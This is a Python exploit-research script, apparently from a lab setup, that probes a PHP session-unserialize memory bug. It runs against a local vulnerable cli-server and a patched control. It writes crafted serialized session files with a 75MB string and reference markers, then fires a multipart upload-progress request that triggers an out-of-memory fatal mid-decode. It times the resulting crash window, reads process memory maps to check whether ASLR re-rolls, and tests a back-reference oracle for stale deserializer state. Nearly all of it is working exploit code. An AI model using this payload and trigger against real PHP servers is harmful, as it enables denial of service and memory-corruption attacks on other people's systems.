#!/usr/bin/env python3
"""smb_q1_fatal_window.py — Q1: fatal-window analysis on cli-server :8151.

619-class OOM producer (wpbleed recipe, adapted to this fixture):
  staged session file `poc|a:2:{i:0;s:3:"abc";i:1;s:75000000:"<75MB A>";}`
  + tiny multipart (PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + 1B file part)
  -> rfc1867 start-event initializes session -> ps_read decodes 75MB string
  -> OOM (150MB+ > memory_limit 128M) mid-decode, INSIDE the update path.

Measurements:
  1. does php -S DIE (502 window + keepalive restart) or SURVIVE the
     bailout (request-level fatal, process keeps serving)?
  2. window length + pid/bias re-roll if it dies
  3. if it survives: does the 619 stale state persist for a consumer?
     (walk oracle: R:14 self-resolve token staged on a second sid)
  4. ctrl :8152 (8.4.27): same fire — must NOT fall (patched bailout),
     and no stale resolve
  5. repeatability x3

Assisted staging (docker exec session-file writes) = lab hands, channel
honesty per wpbleed precedent.
"""
import re
import socket
import subprocess
import sys
import time
import urllib.request

VULN = "127.0.0.1:8151"
CTRL = "127.0.0.1:8152"
CT = {"vuln": "stealmybitcoin-smb-php-vuln-1", "ctrl": "stealmybitcoin-smb-php-ctrl-1"}
BIG = 75_000_000
BND = b"Q1WIN"


def docker_exec(ct, cmd, timeout=20):
    r = subprocess.run(["timeout", "18", "docker", "exec", ct, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout)
    return r.returncode, (r.stdout + r.stderr).strip()


def helper_read(kind, expr, timeout=20):
    inner = 'P=$(pgrep -f "php -S" | head -1); ' + expr
    r = subprocess.run(["timeout", "18", "docker", "run", "--rm", "--cap-add",
                        "SYS_PTRACE", "--pid=container:" + CT[kind],
                        "alpine", "sh", "-c", inner],
                      capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip()


def snap(kind):
    out = helper_read(kind, "echo PID=$P; head -1 /proc/$P/maps")
    m = re.search(r"PID=(\d+)\n([0-9a-f]+)-", out)
    return (int(m.group(1)), int(m.group(2), 16)) if m else None


def mp_min(host_port, sid, timeout=30):
    """Tiny multipart: PHPSESSID field + progress field + 1B file part."""
    body = (b"--" + BND + b"\r\n"
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            + sid.encode() + b"\r\n"
            b"--" + BND + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b'poc\r\n'
            b"--" + BND + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n"
            b"--" + BND + b"--\r\n")
    host, port = host_port.split(":")
    t0 = time.time()
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.sendall((f"POST /ping.php HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                   ).encode() + body)
        s.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
        s.close()
    except Exception as e:
        return f"EXC {type(e).__name__}", time.time() - t0
    first = buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(empty)"
    return first, time.time() - t0


MARKERS = [b"MK%02d-%s" % (i, b"S" * (60 * (i + 1))) for i in range(12)]


def stage_producer(kind, sid):
    """wpbleed producer staging EXACTLY (12 markers, then poc|a:2 + BIG):
    markers push var_entries slots 1..12 so the consumer's R:14 hits its
    own WALKOK string (self-resolve) iff the stale used_slots survived."""
    head = b"".join(b"p%d|" % i + b's:%d:"' % len(MARKERS[i]) + MARKERS[i] + b'";'
                    for i in range(12)) + \
           b'poc|a:2:{i:0;' + b's:3:"abc"' + b'i:1;s:%d:"' % BIG
    h64 = subprocess.run(["base64", "-w0"], input=head,
                         capture_output=True).stdout.decode()
    t64 = subprocess.run(["base64", "-w0"], input=b'";}',
                          capture_output=True).stdout.decode()
    rc, out = docker_exec(CT[kind],
        f"F=/tmp/sess_{sid}; rm -f $F; echo {h64} | base64 -d > $F; "
        f"head -c {BIG} /dev/zero | tr '\\0' 'A' >> $F; "
        f"echo {t64} | base64 -d >> $F; "
        f"chown nobody:nobody $F; chmod 600 $F; wc -c < $F")
    return rc == 0 and out.isdigit(), out


def stage_walk(kind, sid):
    tok = b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:14;}'
    t64 = subprocess.run(["base64", "-w0"], input=tok,
                         capture_output=True).stdout.decode()
    rc, out = docker_exec(CT[kind],
        f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
        f"chown nobody:nobody $F; chmod 600 $F")
    return rc == 0


def healthy(host_port, deadline=20.0):
    """Poll until 200 pong; return seconds or None."""
    t0 = time.time()
    last = None
    while time.time() - t0 < deadline:
        try:
            req = urllib.request.Request(
                f"http://{host_port}/ping.php", data=b"message=ping",
                headers={"Content-Type": "application/x-www-form-urlencoded"})
            with urllib.request.urlopen(req, timeout=2) as r:
                if r.status == 200:
                    return time.time() - t0, last
        except urllib.error.HTTPError as e:
            last = e.code
        except Exception as e:
            last = type(e).__name__
        time.sleep(0.1)
    return None, last


def fire_producer_and_measure(kind, host_port, label):
    print(f"--- {label}: producer fire x1 ---")
    s0 = snap(kind)
    print(f"    pre:  pid={s0[0]} base=0x{s0[1]:x}")
    sid = f"q1{kind}{int(time.time())}"
    ok, sz = stage_producer(kind, sid)
    print(f"    staged producer sess {sid} ({sz} bytes): {ok}")
    first, dt = mp_min(host_port, sid)
    print(f"    producer response: {first} ({dt:.2f}s)")
    t0 = time.time()
    # window probe: tight 100ms poll of plain GETs
    codes = []
    while time.time() - t0 < 12.0:
        try:
            with urllib.request.urlopen(f"http://{host_port}/", timeout=2) as r:
                codes.append(r.status)
        except urllib.error.HTTPError as e:
            codes.append(e.code)
        except Exception:
            codes.append(0)
        time.sleep(0.1)
        if codes and codes[-1] == 200 and len(codes) > 1:
            break
    died = any(c in (502, 0) for c in codes)
    print(f"    post-fire poll: {codes[:20]}{'...' if len(codes) > 20 else ''}")
    if died:
        window = time.time() - t0
        s1 = snap(kind)
        print(f"    => PROCESS DIED. 502 window ~{window:.2f}s; "
              f"new pid={s1[0]} base=0x{s1[1]:x} "
              f"(bias re-rolled: {s1[1] != s0[1]})")
        return "died", window
    else:
        s1 = snap(kind)
        print(f"    => PROCESS SURVIVED (request-level fatal only). "
              f"pid stable: {s1[0] == s0[0]}, base stable: {s1[1] == s0[1]}")
        return "survived", 0.0


def consumer_probe(kind, host_port, label):
    """Walk oracle: R:14 self-resolve -> WALKOK1! roundtrip into the sess file."""
    print(f"--- {label}: consumer walk-oracle (R:14 self-resolve) ---")
    sid = f"q1w{kind}{int(time.time())}"
    stage_walk(kind, sid)
    first, dt = mp_min(host_port, sid)
    rc, out = docker_exec(CT[kind], f"cat /tmp/sess_{sid} 2>/dev/null")
    hit = "WALKOK1!" in out
    print(f"    consumer resp: {first}; sess file now: {out[:120]!r}")
    print(f"    => stale 619 state {'PRESENT (R:14 resolved)' if hit else 'absent'}")
    return hit


def main():
    print("== Q1: fatal-window analysis — cli-server under a 619 OOM producer ==\n")
    for trial in range(1, 4):
        res, window = fire_producer_and_measure("vuln", VULN, f":8151 vuln trial {trial}")
        if res == "died":
            t, last = healthy(VULN)
            print(f"    full recovery to 200: {t:.1f}s" if t else "    NO RECOVERY")
    # if the process survives the fatal, the 619 consumer question opens up
    consumer_probe("vuln", VULN, ":8151 vuln (post-fatals)")
    print()
    # ctrl: patched 8.4.27 must NOT fall
    res, window = fire_producer_and_measure("ctrl", CTRL, ":8152 ctrl (patched)")
    consumer_probe("ctrl", CTRL, ":8152 ctrl (patched)")
    t, last = healthy(CTRL)
    print(f"    ctrl healthy: {t is not None} (last={last})")
    print("\n== Q1 verdict: see notes.md ==")


if __name__ == "__main__":
    main()
